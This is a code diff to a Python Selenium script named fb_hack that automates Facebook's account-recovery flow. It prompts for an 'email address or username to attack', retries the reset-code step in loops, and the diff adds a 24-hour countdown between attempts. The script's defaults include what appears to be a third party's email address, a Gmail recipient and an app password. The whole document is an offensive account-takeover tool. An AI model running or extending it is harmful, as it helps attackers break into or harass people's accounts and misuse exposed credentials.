@@ -55,6 +55,7 @@ def fb_hack(email, codex, respect):
     sleep(2)
     driver.save_screenshot("/data/data/com.termux/files/home/storage/pictures/fail1.png")
     print("Failed at email")
+    return
   try:
     search_button = driver.find_element(by = By.XPATH, value = "/html/body/div[1]/div[1]/div[1]/div/div/form/div/div[3]/div/div[1]/button")
     search_button.click()
@@ -63,8 +64,7 @@ def fb_hack(email, codex, respect):
     sleep(2)
     driver.save_screenshot("/data/data/com.termux/files/home/storage/pictures/fail2.png")
     print("Failed at try another way")
-    dud = input()
-    sys.exit()
+    return
   counter = 0
   test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
@@ -120,6 +120,14 @@ def fb_hack(email, codex, respect):
       sleepy(30)
   past = int(respect)
   return past
+def countdown(t):
+    while t:
+        mins, secs = divmod(t, 60)
+        timer = '{:02d}:{:02d}'.format(mins, secs)
+        print(timer, end="\r")
+        time.sleep(1)
+        t -= 1
+    print('Time is up!')
 
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
@@ -130,6 +138,11 @@ receiver_email = input("Recipient:") or "ppteam36884@gmail.com"
 password = input("Type your password and press enter:") or "dvxu atqv cngc rojf"
 while past != 0:
   fb_hack(ehack, reset, past)
+  if __name__ == '__main__':
+    # Set the time in seconds (24 hours = 86400 seconds)
+    t = 86400 
+
+    countdown(t)
 
 
 subject = "An email with attachment from Python"
